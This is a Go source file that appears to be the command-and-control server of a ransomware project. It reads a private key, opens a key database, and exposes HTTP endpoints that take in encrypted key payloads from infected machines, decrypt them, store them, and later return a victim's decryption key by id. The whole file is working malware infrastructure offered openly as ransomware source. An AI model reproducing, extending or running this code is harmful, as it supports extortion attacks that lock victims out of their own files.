package main

import (
	"flag"
	"fmt"
	"log"

	"io/ioutil"

	"github.com/labstack/echo/engine"
	"github.com/labstack/echo/engine/standard"
	"github.com/labstack/echo/middleware"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/web"
)

var (
	// BoltDB database to store the keys
	// Will be create if not exists
	database = "database.db"

	// Private key used to decrypt the ransomware payload
	privateKey = "private.pem"
)

func main() {
	port := flag.Int("port", 8080, "The port to listen on")
	flag.Parse()

	privkey, err := ioutil.ReadFile(privateKey)
	if err != nil {
		log.Fatalln(err)
	}

	db := repository.Open(database)
	defer db.Close()

	e := web.NewEngine()
	e.PrivateKey = privkey
	e.Database = db

	e.GET("/", e.Index)

	e.Use(middleware.Logger())
	e.Use(middleware.Recover())

	api := e.Group("/api", middleware.CORS())
	api.POST("/keys/add", e.AddKeys, e.DecryptPayloadMiddleware)
	api.GET("/keys/:id", e.GetEncryptionKey)

	log.Fatal(e.Run(standard.WithConfig(engine.Config{
		Address: fmt.Sprintf(":%d", *port),
	})))
}
